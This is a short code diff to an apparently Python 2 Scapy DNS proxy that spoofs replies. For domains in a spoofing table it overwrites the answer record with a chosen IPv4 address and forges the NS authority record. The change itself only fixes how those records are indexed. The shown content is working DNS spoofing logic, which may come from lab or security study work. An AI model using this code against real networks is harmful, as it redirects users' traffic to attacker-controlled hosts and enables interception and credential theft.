@@ -47,9 +47,9 @@ def handler(data, addr, socket, dns_ip):
             if url in to_be_spoofed:
                 print "Request for %s will be spoofed" % url[:-1]
                 print "Original\n", original_dns_packet.show()
-                original_dns_packet[DNS].an.rdata = to_be_spoofed[url]['ipv4']
+                original_dns_packet[DNS].an[0].rdata = to_be_spoofed[url]['ipv4']
                 original_dns_packet[DNS].ar = NotImplemented
-                original_dns_packet[DNS].ns = DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns'])
+                original_dns_packet[DNS].ns = [DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns'])]
                 print "Spoofed packet", original_dns_packet.show()
                 proxy_response = bytes(original_dns_packet)
             else:
